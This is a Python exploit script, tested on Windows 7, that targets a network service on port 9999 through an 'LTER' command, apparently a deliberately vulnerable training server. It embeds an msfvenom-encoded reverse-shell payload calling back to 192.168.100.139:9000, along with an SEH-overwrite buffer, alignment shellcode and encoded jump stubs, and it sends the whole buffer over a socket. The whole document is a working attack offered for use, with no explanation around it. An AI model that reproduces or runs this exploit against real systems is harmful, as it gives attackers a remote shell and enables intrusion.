# Author: Felipe Winsnes (@whitecr0wz)
# Tested on Windows 7 (x86)

import socket, sys, struct

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.100.139 LPORT=9000 -f py -e x86/alpha_mixed BufferRegister=ESI EXITFUNC=thread > shellcode
# Payload size: 702 bytes

buf =  b""
buf += b"\x56\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
buf += b"\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30"
buf += b"\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42"
buf += b"\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
buf += b"\x59\x6c\x6b\x58\x4c\x42\x65\x50\x37\x70\x63\x30\x53"
buf += b"\x50\x4d\x59\x48\x65\x55\x61\x4f\x30\x71\x74\x6e\x6b"
buf += b"\x62\x70\x66\x50\x6c\x4b\x63\x62\x36\x6c\x4e\x6b\x56"
buf += b"\x32\x74\x54\x4c\x4b\x50\x72\x57\x58\x46\x6f\x78\x37"
buf += b"\x51\x5a\x46\x46\x34\x71\x6b\x4f\x4c\x6c\x67\x4c\x61"
buf += b"\x71\x61\x6c\x35\x52\x54\x6c\x55\x70\x4f\x31\x5a\x6f"
buf += b"\x44\x4d\x46\x61\x79\x57\x6a\x42\x4a\x52\x61\x42\x32"
buf += b"\x77\x6e\x6b\x76\x32\x32\x30\x6e\x6b\x33\x7a\x55\x6c"
buf += b"\x6e\x6b\x72\x6c\x64\x51\x30\x78\x39\x73\x77\x38\x55"
buf += b"\x51\x5a\x71\x63\x61\x4e\x6b\x56\x39\x35\x70\x56\x61"
buf += b"\x38\x53\x6c\x4b\x50\x49\x32\x38\x49\x73\x65\x6a\x72"
buf += b"\x69\x6c\x4b\x54\x74\x6e\x6b\x77\x71\x69\x46\x74\x71"
buf += b"\x4b\x4f\x4e\x4c\x4a\x61\x68\x4f\x56\x6d\x67\x71\x79"
buf += b"\x57\x56\x58\x79\x70\x73\x45\x68\x76\x67\x73\x73\x4d"
buf += b"\x6a\x58\x57\x4b\x61\x6d\x36\x44\x54\x35\x4b\x54\x30"
buf += b"\x58\x4e\x6b\x72\x78\x57\x54\x45\x51\x39\x43\x72\x46"
buf += b"\x6c\x4b\x64\x4c\x42\x6b\x6c\x4b\x66\x38\x45\x4c\x67"
buf += b"\x71\x78\x53\x4c\x4b\x73\x34\x4c\x4b\x37\x71\x6a\x70"
buf += b"\x6d\x59\x51\x54\x57\x54\x64\x64\x63\x6b\x71\x4b\x33"
buf += b"\x51\x43\x69\x70\x5a\x46\x31\x69\x6f\x6b\x50\x61\x4f"
buf += b"\x33\x6f\x63\x6a\x4e\x6b\x36\x72\x6a\x4b\x4e\x6d\x71"
buf += b"\x4d\x30\x68\x47\x43\x70\x32\x37\x70\x67\x70\x62\x48"
buf += b"\x74\x37\x33\x43\x46\x52\x43\x6f\x53\x64\x32\x48\x70"
buf += b"\x4c\x31\x67\x45\x76\x65\x57\x69\x6f\x5a\x75\x4e\x58"
buf += b"\x4c\x50\x35\x51\x43\x30\x75\x50\x56\x49\x38\x44\x31"
buf += b"\x44\x30\x50\x30\x68\x51\x39\x6d\x50\x50\x6b\x33\x30"
buf += b"\x79\x6f\x68\x55\x76\x30\x72\x70\x62\x70\x42\x70\x43"
buf += b"\x70\x62\x70\x71\x50\x30\x50\x55\x38\x6a\x4a\x34\x4f"
buf += b"\x4b\x6f\x4d\x30\x79\x6f\x6e\x35\x6c\x57\x31\x7a\x36"
buf += b"\x65\x51\x78\x49\x50\x69\x38\x45\x34\x6c\x4b\x61\x78"
buf += b"\x35\x52\x55\x50\x76\x43\x75\x78\x6b\x39\x78\x66\x73"
buf += b"\x5a\x62\x30\x33\x66\x73\x67\x72\x48\x6e\x79\x4e\x45"
buf += b"\x44\x34\x53\x51\x6b\x4f\x4a\x75\x6e\x65\x6b\x70\x70"
buf += b"\x74\x54\x4c\x4b\x4f\x50\x4e\x67\x78\x74\x35\x58\x6c"
buf += b"\x75\x38\x68\x70\x4f\x45\x6e\x42\x52\x76\x6b\x4f\x38"
buf += b"\x55\x63\x58\x65\x33\x52\x4d\x30\x64\x73\x30\x4d\x59"
buf += b"\x78\x63\x73\x67\x33\x67\x53\x67\x70\x31\x69\x66\x30"
buf += b"\x6a\x34\x52\x73\x69\x76\x36\x4a\x42\x39\x6d\x43\x56"
buf += b"\x6f\x37\x32\x64\x31\x34\x35\x6c\x56\x61\x63\x31\x6e"
buf += b"\x6d\x47\x34\x55\x74\x76\x70\x38\x46\x45\x50\x61\x54"
buf += b"\x56\x34\x56\x30\x53\x66\x53\x66\x71\x46\x50\x46\x70"
buf += b"\x56\x72\x6e\x43\x66\x32\x76\x76\x33\x50\x56\x52\x48"
buf += b"\x33\x49\x5a\x6c\x75\x6f\x4d\x56\x6b\x4f\x5a\x75\x6e"
buf += b"\x69\x4b\x50\x30\x4e\x70\x56\x30\x46\x59\x6f\x36\x50"
buf += b"\x52\x48\x73\x38\x6d\x57\x55\x4d\x55\x30\x69\x6f\x79"
buf += b"\x45\x6d\x6b\x79\x70\x45\x4d\x45\x7a\x44\x4a\x75\x38"
buf += b"\x4c\x66\x4a\x35\x4d\x6d\x6d\x4d\x69\x6f\x79\x45\x45"
buf += b"\x6c\x35\x56\x51\x6c\x44\x4a\x4d\x50\x39\x6b\x59\x70"
buf += b"\x71\x65\x43\x35\x4f\x4b\x70\x47\x42\x33\x74\x32\x52"
buf += b"\x4f\x30\x6a\x77\x70\x46\x33\x79\x6f\x6b\x65\x41\x41"

nseh = struct.pack("<I", 0x04750674)
seh = struct.pack("<I", 0x6250172B)

alignment = ""
alignment += "\x54\x58\x5B"     # PUSH ESP, POP EAX, POP EBX
alignment += "\x66\x05\x58\x13" # ADD AX, 0x1358
alignment += "\x50\x5C"         # PUSH EAX, POP ESP
alignment += "\x53\x58"         # PUSH EBX, POP EAX
alignment += "\x66\x05\x3D\x0C" # ADD AX, 0xC3D
alignment += "\x50\x5E"         # PUSH EAX, POP ESI

# Encoded "\x53\x5C\x56\xC3" # PUSH EBX, POP ESP. PUSH ESI, RET

pushesi = ""
pushesi += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
pushesi += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
pushesi += "\x05\x32\x36\x33\x62" ## add  eax, 0x62333632
pushesi += "\x05\x21\x26\x23\x61" ## add  eax, 0x61232621
pushesi += "\x50"                 ## push eax


buffer = "LTER /.:/" + "A" * 2000 + buf + "A" * (3515 - 2000 - len(buf)) + nseh + seh + alignment + pushesi + "A" * 500

host = sys.argv[1]

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((host, 9999))

s.send(buffer)

s.close()
